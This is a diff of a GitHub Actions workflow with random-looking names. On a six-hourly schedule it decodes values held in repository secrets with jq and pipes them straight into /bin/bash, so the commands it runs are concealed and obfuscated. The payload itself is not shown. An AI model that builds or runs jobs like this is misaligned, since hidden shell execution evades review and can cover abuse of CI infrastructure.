@@ -2,26 +2,24 @@ name: pousuanshami
 on:
   workflow_dispatch:
   schedule:
-    - cron: '14 2/6 * * *'
-
+    - cron: '3 5/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: pousuanshami
         env:
-          iio7: ${{ secrets.iio7 }}
+          sdqde58: ${{ secrets.sdqde58 }}
         run: |
-          echo $iio7 | jq -r .ijmrw23 | /bin/bash
-          echo $szega297 | jq -r .mpv33218 | /bin/bash
-          echo $wig6882 | jq -r .p24 | /bin/bash
-          echo $qonqp667 | jq -r .wsr10 | /bin/bash
-          echo $occi06169 | jq -r .vu5629 | /bin/bash
-          echo $ofhf0 | jq -r .daak9 | /bin/bash
-          echo $innd4 | jq -r .cgd78217 | /bin/bash
-          echo $ymb08402 | jq -r .nkmve37341 | /bin/bash
-          echo $ny9549 | jq -r .qfu55352 | /bin/bash
-          echo $p706 | jq -r .e6038 | /bin/bash
-          echo $r2 | jq -r .mfo33 | /bin/bash
+          echo $sdqde58 | jq -r .hs92288 | /bin/bash
+          echo $ydlgd753 | jq -r .hocu38309 | /bin/bash
+          echo $he37 | jq -r .fy7407 | /bin/bash
+          echo $ve6022 | jq -r .mgi55 | /bin/bash
+          echo $xje754 | jq -r .wryi7 | /bin/bash
+          echo $ay74465 | jq -r .w06 | /bin/bash
+          echo $vvmkj83 | jq -r .gf49 | /bin/bash
+          echo $mdiq617 | jq -r .e335 | /bin/bash
+          echo $a39 | jq -r .b17978 | /bin/bash
 
